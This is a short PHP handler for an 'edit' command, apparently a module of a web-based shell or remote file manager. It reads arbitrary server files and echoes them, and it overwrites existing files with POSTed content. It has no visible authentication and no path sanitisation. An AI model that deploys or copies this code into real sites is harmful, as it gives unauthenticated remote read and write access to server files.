<?php 

if (startsWith($command, "edit"))
{
	if ($_SERVER["REQUEST_METHOD"] == "GET")
	{
		$splits = explode(" ", $command);
		unset($splits[0]);

		$filename = $_CD . "/" . $splits[1];
		$filename = decodeCMD($filename);
		
		if (file_exists($filename))
		{
			if (filesize($filename) > 1000000)
			{
				header("HTTP/1.0 403 Forbidden");
			}else{
				$content = file_get_contents($filename);

				echo $content;
			}
		}else{
			header("HTTP/1.0 404");
		}
	}
	else if($_SERVER["REQUEST_METHOD"] == "POST")
	{
		$content = $_POST["content"];
		$filename = $_POST["filename"];

		$filename = $_CD . "/" . decodeCMD($filename);

		if (file_exists($filename))
		{
			file_put_contents($filename, $content);
			echo "\"$filename\" successfully saved in the server";
		}else{
			header("HTTP/1.0 404");
		}
	}
}